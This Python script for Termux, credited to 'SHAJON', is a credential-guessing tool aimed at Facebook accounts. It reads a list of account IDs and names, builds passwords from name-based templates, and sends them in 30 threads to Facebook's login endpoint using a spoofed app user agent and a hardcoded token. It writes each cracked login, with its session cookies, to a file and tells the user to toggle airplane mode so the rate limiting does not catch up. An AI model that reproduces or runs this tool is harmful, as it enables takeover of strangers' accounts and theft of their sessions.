#!/data/data/com.termux/files/usr/bin/python3.12
# -*- coding: utf-8 -*-

#SCRIPT WRITTEN BY 👑 SHAJON 👑
#GITHUB : SHAJON-404
#FACEBOOK : https://facebook.com/mdshahomagdum.shajon/
#YOUTUBE : youtube.com/mrlofi404

import os
import sys
import time
import uuid
import json
import random
import gzip
from concurrent.futures import ThreadPoolExecutor as ThreadPool

try:
    import pycurl
except ModuleNotFoundError:
    os.system('pip install pycurl')

import pycurl
from io import BytesIO
os.system("xdg-open https://t.me/SHAJON404_OFFICIAL")

class SHAJON:
    def __init__(self):
        self.loop, self.ok, self.cp, self.plist = 0, [], [], []
        self.linexx = ("=" * 55)
        self.g = "\x1b[1;32m"
        self.r = "\x1b[1;31m"
        self.w = "\x1b[1;37m"
        self.logo = (f' dP""b8 88 888888 888888  || BY {self.g}SHAJON{self.w}' + '\n' +
                     f'dP   `" 88 88__     88    || GitHub : {self.g}SHAJON-404{self.w}' + '\n' +
                     f'Yb  "88 88 88""     88    || GIFTED{self.g} FOR 1K MEMBERS{self.w}' + '\n' +
                     f' YboodP 88 88       88    || TG : {self.g}@SHAJON404_OFFICIAL{self.w}' + '\n' +
                     f'{self.linexx}')

    def linex(self):
        print("=" * 55)

    def clear(self):
        os.system('clear')
        print(self.logo)

    def __shajon__(self):
        self.clear()
        print(' [1] FILE CLONE ')
        print(' [0] EXIT TOOL ')
        self.linex()
        choice = input('<!!> CHOICE : ')
        if choice == '1':
            os.system("xdg-open https://t.me/SHAJON404_OFFICIAL")
            self.file()
        elif choice == '0':
            sys.exit()
        else:
            self.__shajon__()

    def file(self):
        self.clear()
        print('<!!> /sdcard/SHAJON.txt')
        self.linex()
        filename = input('<!!> FILE NAME : ')
        os.system("xdg-open https://t.me/SHAJON404_OFFICIAL")
        try:
            with open(filename, 'r') as f:
                ids_list = f.read().splitlines()
        except FileNotFoundError:
            print('<!!> FILE NOT FOUND')
            time.sleep(1)
            self.file()
            return

        self.clear()
        limit = int(input('<!!> PASSWORD LIMIT : '))
        self.linex()
        print('<!!> EXAMPLE : first last | firstlast | first123')
        self.linex()
        for i in range(limit):
            password = input(f'<!!> PASSWORD NO {i + 1} : {self.g}')
            self.plist.append(password)
            self.linex()

        with ThreadPool(max_workers=30) as executor:
            total_ids = str(len(ids_list))
            self.clear()
            print(f'<!!> TOTAL ID {total_ids}')
            print('<!!> TURN [ON/OFF] AIRPLANE MODE EVERY 3 MIN')
            self.linex()
            for user in ids_list:
                ids, names = user.split('|')
                executor.submit(self.M1, ids, names, self.plist)

        print('\n' + "=" * 55)
        print(f'<!!> THE PROCESS HAS BEEN COMPLETED')
        print(f'<!!> TOTAL OK ID {len(self.ok)}')
        print(f'<!!> TOTAL CP ID {len(self.cp)}')
        print("=" * 55)
        input('<!!> PRESS ENTER TO BACK ')
        self.__shajon__()

    def generate_user_agent(self):
        ua = (f"[FBAN/Orca-Android;FBAV/120.0.0.56.124;FBPN/com.facebook.orca;FBLC/en_US;"
               f"FBBV/209027753;FBCR/Jio 4G;FBMF/OPPO;FBBD/OPPO;FBDV/{str(uuid.uuid4())};"
               f"FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;FBDM{{density=2.0,width=720,height=1412}};]")
        return ua
        
    def M1(self, ids, names, passwords):
        sys.stdout.write(f'\r\r{self.g}[SHAJON-404]-[{self.loop}]-[OK:{len(self.ok)}]-[CP:{len(self.cp)}] ')
        sys.stdout.flush()

        try:
            first_name = names.split(' ')[0]
            last_name = names.split(' ')[1] if len(names.split(' ')) > 1 else first_name

            for __pas__ in passwords:
                passwd = (__pas__
                          .replace('first', first_name.lower())
                          .replace('First', first_name)
                          .replace('last', last_name.lower())
                          .replace('Last', last_name)
                          .replace('Name', names)
                          .replace('name', names.lower()))

                data = {
                    'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': ids,
                    'password': passwd,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'en_US',
                    'client_country_code': 'US',
                    'fb_api_req_friendly_name': 'authenticate',
                    'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                }

                headers = [
                    f'User-Agent: {self.generate_user_agent()}',
                    'Accept-Encoding: gzip, deflate',
                    'Connection: close',
                    'Content-Type: application/x-www-form-urlencoded',
                    'Host: graph.facebook.com',
                    f'X-FB-Net-HNI: {random.randint(20000, 20000)}',
                    f'X-FB-SIM-HNI: {random.randint(20000, 20000)}',
                    'Authorization: OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Connection-Type: WIFI',
                    'X-Tigon-Is-Retry: False',
                    'x-fb-session-id: nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                    'x-fb-device-group: 5120',
                    'X-FB-Friendly-Name: ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags: graphservice',
                    'X-FB-HTTP-Engine: Liger',
                    'X-FB-Client-IP: True',
                    'X-FB-Server-Cluster: True',
                    'x-fb-connection-token: 62f8ce9f74b12f84c123cc23437a4a32',
                ]
                
                url = 'https://graph.facebook.com/auth/login'
                buffer = BytesIO()
                c = pycurl.Curl()
                c.setopt(c.URL, url)
                c.setopt(c.HTTPHEADER, headers)
                c.setopt(c.WRITEDATA, buffer)
                data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
                c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
                c.perform()
                c.close()

                response_data = buffer.getvalue()

                try:
                    decompressed_data = gzip.decompress(response_data).decode('utf-8')
                except OSError:
                    decompressed_data = response_data.decode('utf-8')

                response = json.loads(decompressed_data)

                if 'access_token' in response:
                    print(f'\r\r{self.g}[SHAJON-OK] {ids} | {passwd}')
                    cookies = ";".join(f"{c["name"]}={c["value"]}" for c in response["session_cookies"])
                    with open('/sdcard/SHAJON-FILE-OK.txt', 'a') as f:
                        f.write(f'{ids}|{passwd}|{cookies}\n')
                    self.ok.append(ids)
                    break
                elif 'www.facebook.com' in response.get('error', {}).get('message', ''):
                    print(f'\r\r{self.r}[SHAJON-CP] {ids} | {passwd}')
                    with open('/sdcard/SHAJON-FILE-CP.txt', 'a') as f:
                        f.write(f'{ids}|{passwd}\n')
                else:
                    continue

            self.loop += 1

        except Exception as e:
            pass
    
    def __approval__(self):
        try:
            #ekhane tomar approval link deo
            urlx1 = "https://example.com"
            appx_buffer = BytesIO()
            appx_curl = pycurl.Curl()
            appx_curl.setopt(pycurl.URL, urlx1)
            appx_curl.setopt(pycurl.WRITEDATA, appx_buffer)
            appx_curl.perform()
            appx_data = appx_buffer.getvalue().decode("utf-8").splitlines()
            raw = "".join(appx_data)
        except pycurl.error as e:
            exit("<!!> SOMETHING WENT WRONG...!")
        key1 = str(os.geteuid()).upper()
        keys = "X".join(key1)
        
        if keys in raw:
            tool = SHAJON()
            tool.__shajon__()
        else:
            self.clear()
            print("<!!> YOUR KEY IS NOT APPROVED...!")
            print("<!!> CONTACT ADMIN FOR APPROVAL...✅")
            print("<!!> YOUR KEY : "+ keys)
            self.linex()
            sys.exit()
if __name__ == '__main__':
    tool = SHAJON()
    tool.__approval__()